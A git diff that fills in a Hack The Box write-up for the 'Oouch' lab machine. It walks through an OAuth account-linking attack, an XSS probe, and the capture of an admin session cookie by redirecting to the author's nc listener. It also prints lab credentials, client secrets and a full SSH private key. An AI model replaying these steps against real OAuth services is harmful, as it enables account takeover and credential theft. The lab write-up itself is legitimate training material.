@@ -1,34 +1,16 @@
-# HTB - <Machine_Name>
+# HTB - Oouch
 
 ## Overview
 
-![](<machine>.infocard.png)
-
-<Short description to include any strange things to be dealt with> 
+![](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/machine%3E.infocard.png)
 
 ## Useful Skills and Tools
-
-#### <Useful thing 1>
-
-<description with generic example>
-
-#### <Useful thing 2>
-
-<description with generic example>
 
 ## Enumeration
 
 ### Nmap scan
 
-First off, I started my enumeration with an nmap scan of `10.10.10.177`.  The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output (`.nmap`,`.gnmap`, and `.xml`)  with filenames of `<name>`.
-
-## Initial Foothold
-
-## Road to User
-
-### Further enumeration
-
-### Finding user creds
+First off, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
 ```bash
 zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch 10.10.10.177
@@ -105,7 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
 
 Next, see if you can connect anonymously to ftp...and we can!
 
-```ftp
+```text
 zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177
 
 Connected to 10.10.10.177. 
@@ -136,59 +118,67 @@ ftp> ls
 ftp> quit
 221 Goodbye.
 ```
-Only one file `project.txt` was on the server, and we couldn't navigate anywhere else.  
-```
+
+Only one file `project.txt` was on the server, and we couldn't navigate anywhere else.
+
+```text
 zweilos@kalimaa:~/htb/oouch$ cat project.txt
 Flask -> Consumer
 Django -> Authorization Server
 ```
-Looks like `Flask` and `Django` are the two types of frameworks for the different services on a website.  Time to check the next ports.  SSH did not allow me to connect without a private key *(note that there is no password though)*.
-```
+
+Looks like `Flask` and `Django` are the two types of frameworks for the different services on a website. Time to check the next ports. SSH did not allow me to connect without a private key _\(note that there is no password though\)_.
+
+```text
 zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
 zweilos@10.10.10.177: Permission denied (publickey).
 ```
-Navigating to `http://10.10.10.177:5000` led to a login page. 
 
-![Screenshot_2020-06-09_15-36-13.png](:/91a33c859d824c42b4166917e9a39adf)
+Navigating to `http://10.10.10.177:5000` led to a login page.
 
-From here I went to the `Register` page, created an account, logged in, and started looking around the internal site.  There was not much to do, though there was an interesting "send a message to the administrator" input box on the `/contact` page.  
+![Screenshot\_2020-06-09\_15-36-13.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/91a33c859d824c42b4166917e9a39adf)
 
-![Screenshot_2020-06-09_15-41-13.png](:/393df88b9d72418ea5a0c29d308b7001)
+## Initial Foothold
 
-Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban (see screenshot below).  Sending the word 'javascript' was fine...but sending just the word 'alert' also triggered this message...There must be some sort of filter, WAF, or IPS.
+From here I went to the `Register` page, created an account, logged in, and started looking around the internal site. There was not much to do, though there was an interesting "send a message to the administrator" input box on the `/contact` page.
 
-![Screenshot_2020-06-09_16-04-27.png](:/73316df3d87344d8b2dd283831284ea6)
+![Screenshot\_2020-06-09\_15-41-13.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/393df88b9d72418ea5a0c29d308b7001)
 
-I then used gobuster to search for more accessible directories and found an `/oauth` page.  `http://10.10.10.177:5000/oauth` led to a "hidden" page with the following links:
+Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'javascript' was fine...but sending just the word 'alert' also triggered this message...There must be some sort of filter, WAF, or IPS.
 
-![Screenshot_2020-06-10_10-17-42.png](:/e69b5d4da51b4a17b3daf98f9b3dba23)
+![Screenshot\_2020-06-09\_16-04-27.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/73316df3d87344d8b2dd283831284ea6)
 
-> - In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
-> - Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`
+I then used gobuster to search for more accessible directories and found an `/oauth` page. `http://10.10.10.177:5000/oauth` led to a "hidden" page with the following links:
 
-After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`.  I added the newly enumerated domains to my `/etc/hosts` file so I could proceed.
-```
+![Screenshot\_2020-06-10\_10-17-42.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/e69b5d4da51b4a17b3daf98f9b3dba23)
+
+> * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
+> * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`
+
+After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added the newly enumerated domains to my `/etc/hosts` file so I could proceed.
+
+```text
 10.10.10.177    oouch.htb
 10.10.10.177    consumer.oouch.htb
 10.10.10.177    authorization.oouch.htb
 ```
-I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register.  The register link was at the root at `http://authorization.oouch.htb:8000/`.  
 
-![Screenshot_2020-06-10_11-16-23.png](:/e1b620fe56b840d5906f80a55016001c)
+I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at `http://authorization.oouch.htb:8000/`.
+
+![Screenshot\_2020-06-10\_11-16-23.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/e1b620fe56b840d5906f80a55016001c)
 
 I used these sites to do some research on the Oauth 2 protocol:
-> [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)
-> [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/)
-> [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
 
+> [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/) [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/) [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
 
-After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.  
+After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.
 
-![Screenshot_2020-06-13_07-09-34.png](:/5997e8937cb64c9b86dc73c16df1f88d)
+![Screenshot\_2020-06-13\_07-09-34.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/5997e8937cb64c9b86dc73c16df1f88d)
 
-They didn't seem to do anything yet (according to my research I needed a higher privilege authorization token), so I went back to original account on `http://consumer.oouch.htb:5000/oauth` to use the `/connect` link to authorize my two accounts to connect. Using Burp, I allowed each of the requests until got to the button to authorize the connect:
+They didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\), so I went back to original account on `http://consumer.oouch.htb:5000/oauth` to use the `/connect` link to authorize my two accounts to connect. Using Burp, I allowed each of the requests until got to the button to authorize the connect:
 
-I then clicked the button, allowed the POST to the server in Burp, 
+I then clicked the button, allowed the POST to the server in Burp,
+
 ```http
 POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -206,7 +196,9 @@ DNT: 1
 
 csrfmiddlewaretoken=ZNU3fziGduXycKscNjozBj8EY2TLhuRYei3lxLEWB80XoWZSBdn8SXVIb4zZb7G0&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
 ```
-...then intercepted the GET request with the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked.  I needed to start the authorization process in order to get a link that I could use to get any other account to connect to mine.
+
+...then intercepted the GET request with the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked. I needed to start the authorization process in order to get a link that I could use to get any other account to connect to mine.
+
 ```http
 GET /oauth/connect/token?code=OcnuHPMmp4x0UcGjI9Tp87tnvxdfI6 HTTP/1.1
 Host: consumer.oouch.htb:5000
@@ -221,39 +213,41 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
-Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier.  All I needed was for the admin to click the link to connect our accounts.  This was an example of an attack called [Server-side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).  
+## Road to User
 
-The link I sent: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` *(copied from the url bar after Burp dropped the `GET` above.)*  I then used the link  `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
-> *Note: You have to log in fast otherwise the token expires!*
+Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).
+
+The link I sent: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` above.\)_ I then used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
+
+> _Note: You have to log in fast otherwise the token expires!_
 
 The `/profile` page now showed:
 
-![Screenshot_2020-06-10_15-42-54.png](:/a1d2ce22c3da4e43bd3d9948c5a39668)
+![Screenshot\_2020-06-10\_15-42-54.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/a1d2ce22c3da4e43bd3d9948c5a39668)
 
-> Username: qtc
-> Email: qtc@nonexistend.nonono
-> Connected-Accounts: kainoauth.
+> Username: qtc Email: qtc@nonexistend.nonono Connected-Accounts: kainoauth.
+
+### Finding the developer creds
 
 And on the `/documents` page we now had the following:
 
 > Hello qtc! You have currently following documents stored:
+>
+> * dev\_access.txt        **develop:supermegasecureklarabubu123!** -&gt; Allows application registration.
+> * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
+> * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...
 
-> - dev_access.txt		**develop:supermegasecureklarabubu123!** -> Allows application registration.
-> - o_auth_notes.txt	/api/get_user -> user data. oauth/authorize -> Now also supports GET method.
-> - todo.txt			Chris mentioned all users could obtain my ssh key. Must be a joke...
+We now have some developer creds...but where to use them? I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gives us a basic authentication login to use the develop creds above...and now we can register an application!?
 
-We now have some developer creds...but where to use them?  I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gives us a basic authentication login to use the develop creds above...and now we can register an application!?
-
-![Screenshot_2020-06-11_02-17-02.png](:/bd448d933cc9493fb8b87d68119036f8)
-*I forgot the port on my redirect URL the first time.  Luckily there is an edit button!*
-
+![Screenshot\_2020-06-11\_02-17-02.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/bd448d933cc9493fb8b87d68119036f8) _I forgot the port on my redirect URL the first time. Luckily there is an edit button!_
 
 > Here is some programming information about registering Django apps at [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html).  
->I also did some more research at [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) on how to register a new application.  
+> I also did some more research at [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) on how to register a new application.
 
-You can apparently set the authorization link to redirect whereever you want.  By setting the redirect url to be my local machine, I could then listen for a connection with nc.
+You can apparently set the authorization link to redirect whereever you want. By setting the redirect url to be my local machine, I could then listen for a connection with nc.
 
 My registration request looked like this in Burp:
+
 ```http
 POST /oauth/applications/register/ HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -272,6 +266,7 @@ DNT: 1
 
 csrfmiddlewaretoken=8saMcdN6jW2HIJjcK33GCJ7TeAXljGnDvZbLYVRNgNzPSGJ1xWjjhYWRalMvov1A&name=kaio&client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&initial-client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&initial-client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&client_type=public&authorization_grant_type=authorization-code&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234
 ```
+
 ```http
 GET /accounts/login/?next=/oauth/applications/register/ HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -285,9 +280,11 @@ Cookie: csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733Hrf
 Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
-> *Side note: After creating app and clicking "back" it prompts for basic authentication with the text “Oouch Admin Only” at url `http://authorization.oouch.htb:8000/oauth/applications/`.  The `develop` creds did not work here.*
+
+> _Side note: After creating app and clicking "back" it prompts for basic authentication with the text “Oouch Admin Only” at url `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here._
 
 I then sent an authorize request to the server to connect to the app I 'created', which should redirect to my nc listener:
+
 ```http
 GET /oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -300,13 +297,17 @@ Cookie: csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eO
 Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
+
 Got a connection from nc!
+
 ```bash
 zweilos@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
 listening on [any] 1234 ...                                                                            
 connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
 ```
+
 The connection only sent this message, but it was enough to see that it worked how I wanted.
+
 ```http
 GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -318,12 +319,14 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 Host: 10.10.14.253:1234
 ```
+
 After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info:
 
-`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS`.  
+`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS`.
 
-And I got a reply! 
-```http	
+And I got a reply!
+
+```http
 GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
 Host: 10.10.14.253:1234
 User-Agent: python-requests/2.21.0
@@ -332,22 +335,26 @@ Accept: */*
 Connection: keep-alive
 Cookie: sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
 ```
-I now had a session cookie to log into `http://authorization.oouch.htb:8000/` as `qtc` *(I first tried it on `http://consumer.oouch.htb:5000`, but it didn't do anthing)*.  
 
-![Screenshot_2020-06-11_02-51-40.png](:/ef90dd137e424532a784cb6e8af88a11)
+I now had a session cookie to log into `http://authorization.oouch.htb:8000/` as `qtc` _\(I first tried it on `http://consumer.oouch.htb:5000`, but it didn't do anthing\)_.
 
-
+![Screenshot\_2020-06-11\_02-51-40.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/ef90dd137e424532a784cb6e8af88a11)
 
 Now that I had another account, it was time to try to get an authorization token to access the APIs `/oauth/token` and `/oauth/get_user` I saw earlier.
 
 Next I did more oauth 2 research, in particular on authenticating to APIs:
-> - https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end
-> - https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm
-	I found out that the grant type must be `client_credentials`
-> - https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/
-	and the request must also include `client_id` and `client_secret`.
+
+> * [https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end](https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end)
+> * [https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm](https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm)
+>
+>     I found out that the grant type must be `client_credentials`
+>
+> * [https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/](https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/)
+>
+>     and the request must also include `client_id` and `client_secret`.
 
 My first attempts failed:
+
 ```http
 POST /oauth/token/ HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -358,7 +365,8 @@ grant_type=client_credentials&
 client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&
 client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
 ```
-```http	
+
+```http
 HTTP/1.1 401 Unauthorized
 Content-Type: application/json
 Cache-Control: no-store
@@ -368,11 +376,13 @@ X-Frame-Options: SAMEORIGIN
 Content-Length: 27
 Vary: Authorization
 
-{"error": "invalid_client"} 
+{"error": "invalid_client"}
 ```
+
 I kept getting `"invalid_grant_type"` and `"invalid_client"` errors, and found out that the the request cannot have newlines in it! [https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an](https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an)
 
 My next attempt went better:
+
 ```http
 POST /oauth/token/ HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -381,6 +391,7 @@ Content-Length: 223
 
 grant_type=client_credentials&client_id=BINNWck8w5CElXxFcUp4hWlbbnJ9YSRautJ2WNjh&client_secret=MGOEEB0A2EptkpF35uYoJOwVgBQDISm2RQAzojkGK4N3whYaSiAl3mjf7EoPyjteCGoJbuiMCSNI1OhxzjEpETFNoUSHvIaMsIUVEos1KKumTFlZ3obeZYhMYthZKVIz
 ```
+
 ```http
 HTTP/1.1 200 OK
 Content-Type: application/json
@@ -392,7 +403,11 @@ Vary: Authorization
 
 {"access_token": "A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
 ```
-I got the access token!  I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful.  The note on qtc's `/documents` page mentioned easy **user** access to the ssh key...
+
+### Finding user creds
+
+I got the access token! I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful. The note on qtc's `/documents` page mentioned easy **user** access to the ssh key...
+
 ```http
 GET /api/get_ssh/?access_token=A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -406,7 +421,9 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 Cache-Control: max-age=0
 ```
-And we got the SSH key!  It annoyingly was on a single line and had a lot of `\n` characters in it that had to be fixed.
+
+And we got the SSH key! It annoyingly was on a single line and had a lot of `\n` characters in it that had to be fixed.
+
 ```http
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
@@ -416,8 +433,10 @@ Vary: Authorization, Cookie
 
 {"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
 ```
-The next step was to use SSH to login to the machine. *`ssh -i < private_key_name>` lets you use a private key to login.*
-> *Note: Dont forget to `chmod 600` your ssh keys before use!*
+
+The next step was to use SSH to login to the machine. _`ssh -i < private_key_name>` lets you use a private key to login._
+
+> _Note: Dont forget to `chmod 600` your ssh keys before use!_
 
 ### User.txt
 
@@ -446,23 +465,25 @@ qtc@oouch:~$ cat user.txt
 
 qtc@oouch:~$ cat .note.txt 
 Implementing an IPS using DBus and iptables == Genius?
-
 ```
-I got the `user.txt`!  There was also a hidden file named `.note.txt` that mentioned using `DBus` and `iptables` to implement an IPS.  
+
+I got the `user.txt`! There was also a hidden file named `.note.txt` that mentioned using `DBus` and `iptables` to implement an IPS.
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User - qtc
+### Enumeration as user - `qtc`
 
 While enumerating I found a `htb.oouch.Block.conf` in the dbus configuration files:
+
 ```bash
 qtc@oouch:/etc/dbus-1/system.d$ ls
 bluetooth.conf                      htb.oouch.Block.conf             wpa_supplicant.conf
 com.ubuntu.SoftwareProperties.conf  org.freedesktop.PackageKit.conf
 
-qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf 
+qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
 ```
-```xml
+
+```markup
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
 <!DOCTYPE busconfig PUBLIC
@@ -482,9 +503,11 @@ qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
 
 </busconfig>
 ```
+
 So the www-data can send and recieve on dbus using `htb.oouch.Block`...but not sure how to use this right now.
 
 As seen in my `ip a` output Docker is running...can I connect?
+
 ```bash
 3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
     link/ether 02:42:f9:aa:6c:dd brd ff:ff:ff:ff:ff:ff
@@ -497,9 +520,10 @@ As seen in my `ip a` output Docker is running...can I connect?
     inet6 fe80::42:61ff:fe5e:2bbf/64 scope link
        valid_lft forever preferred_lft forever
 ```
-The answer was yes!  After connecting through ssh with the same key for user `qtc`, I began enumerating the docker container.  It took a few tries to find an IP I could connect to (`172.18.0.5`).  
 
-> *Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized.  It was `172.178.0.4` the next time I did it.*
